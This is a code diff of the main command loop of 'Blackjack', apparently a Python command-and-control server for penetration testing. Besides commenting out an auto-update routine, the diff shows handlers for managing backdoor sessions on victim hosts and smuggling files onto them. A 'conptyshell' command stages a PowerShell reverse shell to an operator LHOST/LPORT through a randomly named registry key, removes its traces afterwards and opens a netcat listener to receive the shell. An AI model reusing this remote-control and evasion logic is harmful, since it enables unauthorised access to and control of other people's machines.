@@ -723,96 +723,96 @@ def main():
     current_wd = os.path.dirname(os.path.abspath(__file__))
     
     # Check for updates
-    if not args.skip_update:
-        
-        try:
-            local_files_path = current_wd + os.sep
-            branch = 'main' 
-            url = f'https://api.github.com/repos/r0jahsm0ntar1/africana-framework/src/externals/Blackjack/git/trees/{branch}?recursive=1'
-            raw_url = f'https://raw.githubusercontent.com/r0jahsm0ntar1/africana-framework/src/externals/Blackjack/{branch}/'
-            Loading.active = True
-            loading_animation = Thread(target = Loading.animate, args = (f'[{INFO}] Checking for updates',), name = 'loading_animation', daemon = True).start()
+#    if not args.skip_update:
+#        
+#        try:
+#            local_files_path = current_wd + os.sep
+#            branch = 'main' 
+#            url = f'https://api.github.com/repos/r0jahsm0ntar1/africana-framework/src/externals/Blackjack/git/trees/{branch}?recursive=1'
+#            raw_url = f'https://raw.githubusercontent.com/r0jahsm0ntar1/africana-framework/src/externals/Blackjack/{branch}/'
+#            Loading.active = True
+#            loading_animation = Thread(target = Loading.animate, args = (f'[{INFO}] Checking for updates',), name = 'loading_animation', daemon = True).start()
 
             
-            def get_local_file_hash(filename):
-                
-                try:
-                    with open(local_files_path + filename, 'rb') as f:
-                        data = f.read()
-                        return md5(data).hexdigest()
-                        
-                except FileNotFoundError:
-                    return False
-        
-        
-            def update_file(filename, data):
-        
-                try:
-                    with open(local_files_path + filename, 'wb') as f:
-                        f.write(data)
-                        return True
-                        
-                except:
-                    return False
-        
-        
-            try:
-                response = requests_get(url = url, timeout=(5, 27))
-                response.raise_for_status()  # raises stored HTTPError, if one occurred
-                res_status_code = response.status_code
-                
-            #except requests.exceptions.HTTPError as e:
-                #print(f'\r[{ERR}] Failed to fetch latest version data: {e}') 
-                
-            except Exception as e:
-                res_status_code = -1
-                Loading.stop()
-                print(f'\r[{ERR}] Failed to fetch latest version data: {e}') 
-        
-        
-            if res_status_code == 200:
-                
-                files = [file['path'] for file in response.json()['tree'] if file['type'] == 'blob']
-                update_consent = False
-                
-                for filename in files:
-                    file_data = requests_get(url = raw_url + filename, timeout=(5, 27))
-                    latest_signature = md5(file_data.content).hexdigest()
-                    local_signature = get_local_file_hash(filename)
-                    
-                    if not local_signature or (local_signature != latest_signature):
-                        Loading.stop()
-                        
-                        if not update_consent:                
-                            consent = input(f'\r[{INFO}] Updates detected. Would you like to proceed? [y/n]: ').lower().strip()
-        
-                            if consent in ['y', 'yes']:
-                                update_consent = True
-                                Loading.active = True
-                                loading_animation = Thread(target = Loading.animate, args = (f'[{INFO}] Updating',), name = 'loading_animation', daemon = True).start()
-                            else:
-                                break
-                            
-                        if update_consent:
-                            updated = update_file(filename, file_data.content)
-                            
-                            if not updated:
-                                Loading.stop()
-                                print(f'\r[{ERR}] Error while updating files. Installation may be corrupt. Consider reinstalling Blackjack.')
-                                exit(1)
-                                
-                if update_consent:
-                    Loading.stop()
-                    print(f'\r[{INFO}] Update completed!')
-                    os.execv(sys.executable, ['python3'] + sys.argv + ['-q'] + ['-s'])
-                else:
-                    Loading.stop(print_nl = True)    
-            else:
-                Loading.stop(print_nl = True)
-                
-        except KeyboardInterrupt:
-            Loading.stop(print_nl = True)
-            pass
+#            def get_local_file_hash(filename):
+#                
+#                try:
+#                    with open(local_files_path + filename, 'rb') as f:
+#                        data = f.read()
+#                        return md5(data).hexdigest()
+#                        
+#                except FileNotFoundError:
+#                    return False
+#        
+#        
+#            def update_file(filename, data):
+#        
+#                try:
+#                    with open(local_files_path + filename, 'wb') as f:
+#                        f.write(data)
+#                        return True
+#                        
+#                except:
+#                    return False
+#        
+       
+#            try:
+#                response = requests_get(url = url, timeout=(5, 27))
+#                response.raise_for_status()  # raises stored HTTPError, if one occurred
+#                res_status_code = response.status_code
+#                
+#            #except requests.exceptions.HTTPError as e:
+#                #print(f'\r[{ERR}] Failed to fetch latest version data: {e}') 
+#                
+#            except Exception as e:
+#                res_status_code = -1
+#                Loading.stop()
+#                print(f'\r[{ERR}] Failed to fetch latest version data: {e}') 
+#        
+#        
+#            if res_status_code == 200:
+#                
+#                files = [file['path'] for file in response.json()['tree'] if file['type'] == 'blob']
+#                update_consent = False
+#                
+#                for filename in files:
+#                    file_data = requests_get(url = raw_url + filename, timeout=(5, 27))
+#                    latest_signature = md5(file_data.content).hexdigest()
+#                    local_signature = get_local_file_hash(filename)
+#                    
+#                    if not local_signature or (local_signature != latest_signature):
+#                        Loading.stop()
+#                        
+#                        if not update_consent:                
+#                            consent = input(f'\r[{INFO}] Updates detected. Would you like to proceed? [y/n]: ').lower().strip()
+#        
+#                            if consent in ['y', 'yes']:
+#                                update_consent = True
+#                                Loading.active = True
+#                                loading_animation = Thread(target = Loading.animate, args = (f'[{INFO}] Updating',), name = 'loading_animation', daemon = True).start()
+#                            else:
+#                                break
+#                            
+#                        if update_consent:
+#                            updated = update_file(filename, file_data.content)
+#                            
+#                            if not updated:
+#                                Loading.stop()
+#                                print(f'\r[{ERR}] Error while updating files. Installation may be corrupt. Consider reinstalling Blackjack.')
+#                                exit(1)
+#                                
+#                if update_consent:
+#                    Loading.stop()
+#                    print(f'\r[{INFO}] Update completed!')
+#                    os.execv(sys.executable, ['python3'] + sys.argv + ['-q'] + ['-s'])
+#                else:
+#                    Loading.stop(print_nl = True)    
+#            else:
+#                Loading.stop(print_nl = True)
+#                
+#        except KeyboardInterrupt:
+#            Loading.stop(print_nl = True)
+#            pass
             
     # Initialize essential services
     print(f'{BLUE}         ~>[{END}{DARKCYAN} Initializing required services {BLUE}]<~{END}\n')
@@ -828,10 +828,10 @@ def main():
 
     while time() < (timeout_start + 5):
 
-        if core.core_initialized:                                                    
+        if core.core_initialized:
             break
         
-        elif core.core_initialized == False:            
+        elif core.core_initialized == False:
             sys.exit(1)
             
     else:
@@ -849,10 +849,10 @@ def main():
 
     while time() < (timeout_start + 5):
 
-        if netcat.listener_initialized:                                                    
+        if netcat.listener_initialized:
             break
-        
-        elif netcat.listener_initialized == False:            
+
+        elif netcat.listener_initialized == False:
             sys.exit(1)
             
     else:
@@ -917,9 +917,9 @@ def main():
     comp = Completer()
     global_readline.set_completer_delims(' \t\n;')
     global_readline.parse_and_bind("tab: complete")
-    global_readline.set_completer(comp.complete)            
+    global_readline.set_completer(comp.complete)
 
-    print(f'[{INFO}] Welcome! Type "help" to list available commands.\n')        
+    print(f'[{INFO}] Welcome! Type "help" to list available commands.\n')
     
     ''' +---------[ Command prompt ]---------+ '''
     while True:
@@ -1199,9 +1199,7 @@ def main():
                         else:
                             print('Invalid session ID.')
                     else:
-                        print(f'\rNo active sessions.')        
-
-
+                        print(f'\rNo active sessions.')
 
                 elif cmd == 'repair':
 
@@ -1227,20 +1225,15 @@ def main():
                                 
                             elif result == 0:
                                 print('Success.')
-                            
                         else:
                             print(f'Repair function not applicable on "{key}". Try HOSTNAME or USERNAME.')
-
                     else:
-                        print(sessions_check[1])                            
-
-
+                        print(sessions_check[1])
 
                 elif cmd == 'reset':
-
-                    alias = cmd_list[1]                    
+                    alias = cmd_list[1]
                     sid = Sessions_Manager.alias_to_session_id(alias)
-                    
+
                     if sid == alias:
                         print('Unrecognized alias.')
                     
@@ -1249,58 +1242,34 @@ def main():
                         Sessions_Manager.active_sessions[sid]['alias'] = None
                         Sessions_Manager.aliases.remove(alias)
                         print(f'Alias for session {sid} successfully reset.')
-                        
+
                     else:
                         print('Unrecognized alias.')
 
-
-
                 elif cmd == 'clear':
                     os.system('clear')
-
-
-
                 elif cmd == 'flee':
                     blackjack_out(flee = True)
-
-
-
                 elif cmd == 'exit':
                     raise KeyboardInterrupt
-
-
-
-                elif cmd == 'sessions':                            
+                elif cmd == 'sessions':
                     sessions_manager.list_sessions()
-
-
-
-                elif cmd == 'backdoors':                                        
+                elif cmd == 'backdoors':
                     sessions_manager.list_backdoors()
+                elif cmd == 'sockets':
+                    print_running_services_info()
 
-
-
-                elif cmd == 'sockets':    
-                    print_running_services_info()                
-
-
-
-                elif cmd == 'siblings':                                        
+                elif cmd == 'siblings':
                     core.list_siblings()
-
-
-
-                elif cmd == 'threads':                                        
+                elif cmd == 'threads':
                     print(f'\nThread limiter value: {Threading_params.thread_limiter._value}')
                     threads = enumerate_threads()
                     thread_names = []
-
                     print(f"Active threads ({len(threads)}):\n")
                     for thread in threads:
                         thread_names.append(thread.name)
 
                     print_columns(thread_names)
-
 
                 elif cmd == 'upload':
 
@@ -1313,11 +1282,11 @@ def main():
                     if not session_id:
                         print('Failed to interpret session_id.')
                         Main_prompt.ready = True
-                        continue    
+                        continue
 
                     sessions_check = Sessions_Manager.sessions_check(session_id)
-                    
-                    if sessions_check[0]:                            
+
+                    if sessions_check[0]:
 
                         # Check if file exists
                         if os.path.isfile(file_path):
@@ -1330,21 +1299,18 @@ def main():
                                 # Check if any sibling server has an active pseudo shell on that session
                                 shell_occupied = core.is_shell_session_occupied(session_id)
 
-                                if not shell_occupied:    
+                                if not shell_occupied:
                                     # Check who is the owner of the shell session
                                     session_owner_id = sessions_manager.return_session_attr_value(session_id, 'Owner')
-                                
                                     if session_owner_id == core.return_server_uniq_id():
                                         File_Smuggler.upload_file(file_contents, cmd_list[2], session_id)
-                                    
-                                    else:        
+                                    else:
                                         core.send_receive_one_encrypted(session_owner_id, [file_contents, cmd_list[2], session_id], 'upload_file')
 
                                 else:
                                     print(f'\r[{INFO}] The session is currently being used by a sibling server.')
                                     Main_prompt.ready = True
-                                    continue    
-                                    
+                                    continue
 
                         else:
                             print(f'\r[{ERR}] File {file_path} not found.')
@@ -1358,24 +1324,21 @@ def main():
                         print(sessions_check[1])
                         Main_prompt.ready = True
 
-
-
                 elif cmd == 'conptyshell':
                     
                     lhost = parse_lhost(cmd_list[1])
                     try: lport = int(cmd_list[2])
-                    except: lport = -1                    
+                    except: lport = -1
                     session_id = cmd_list[3]
                     sessions_check = Sessions_Manager.sessions_check(session_id)
                     
                     if sessions_check[0]:
-                        
                         # Parse LHOST
                         if not lhost:
                             print(f'\r[{ERR}] Failed to parse LHOST value.')
                             continue
-                        
-                        # Parse LPORT                    
+
+                        # Parse LPORT
                         if not (lport >= 1 and lport <= 65535):
                             print(f'\r[{ERR}] Failed to parse LPORT value.')
                             continue
@@ -1391,10 +1354,10 @@ def main():
                         session_owner_id = sessions_manager.return_session_attr_value(session_id, 'Owner')
 
                         # Prepare ConPtyShell
-                        if not os.path.isfile(f'{cwd}/resources/external/scripts/Invoke-ConPtyShell.ps1'):                            
+                        if not os.path.isfile(f'{cwd}/resources/external/scripts/Invoke-ConPtyShell.ps1'):
                             print(f'\r[{ERR}] Invoke-ConPtyShell.ps1 not found.')
                             continue
-                        
+
                         script_data = get_file_contents(f'{cwd}/resources/external/scripts/Invoke-ConPtyShell.ps1', mode = 'r')
                         func_name = value_name = get_random_str(10)
                         script_data = script_data.replace('*LHOST*', lhost).replace('*LPORT*', str(lport)).replace('*FUNC*', func_name)
@@ -1419,42 +1382,34 @@ def main():
                         remove_src = f'Remove-Item -Path "HKCU:\Software\{rand_key}" -Recurse'
                         new_proc = Exec_Utils.new_process_wrapper(f"{exec_script}; {func_name}; {remove_src}", session_id)
                         execution_object = Exec_Utils.ps_try_catch_wrapper(f'{reg_polution};{exec_script};({new_proc})', error_action = remove_src)
-                        
-                        #print(execution_object)
 
+                        #print(execution_object)
                         blackjack_cmd = {
                             'data' : execution_object,
                             'quiet' : False
                         }
-
                         # Append script for execution
                         if session_owner_id == core.return_server_uniq_id():
-
                             blackjack_cmd['issuer'] = 'self'
-
                             # Start listener
                             os.system(f'gnome-terminal -- bash -c "stty raw -echo; (stty size; cat) | nc -lvnp {lport}"')
                             sleep(0.2)
                             Blackjack.command_pool[session_id].append(blackjack_cmd)
 
                         else:
-
                             try:
                                 verified = input(f'\r[{WARN}] This session belongs to a sibling server. If the victim host cannot directly reach your host, this operation will fail. Proceed? [y/n]: ')
                             except:
                                 print()
                                 verified = None
-                            
                             if verified.lower().strip() in ['y', 'yes']:
                                 # Start listener
                                 os.system(f'gnome-terminal -- bash -c "stty raw -echo; (stty size; cat) | nc -lvnp {lport}"')
                                 blackjack_cmd['issuer'] = core.return_server_uniq_id()
                                 Core_Server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, blackjack_cmd)
-                                        
+
                     else:
                         print(sessions_check[1])
-
-                        
 
                 elif cmd == 'cmdinspector':
 
@@ -1464,7 +1419,6 @@ def main():
 
                         if option == 'off':
                             Session_Defender.is_active = False
-
                         elif option == 'on':
                             Session_Defender.is_active = True
                         
@@ -1472,8 +1426,6 @@ def main():
 
                     else:
                         print('Value can be on or off.')
-
-
 
                 elif cmd == 'purge':
 
@@ -1490,11 +1442,9 @@ def main():
                     else:
                         continue
 
-
                 else:
                     continue
-        
-        
+
         except KeyboardInterrupt:
             
             if not Main_prompt.ready:
@@ -1505,14 +1455,13 @@ def main():
                 sys.stdout.flush()
                 print()
                 continue
-            
+
             if Main_prompt.exec_active:
                 Main_prompt.exec_active = False
                 print('\r')
                 continue
 
             blackjack_out()
-            
 
 if __name__ == '__main__':
     main()
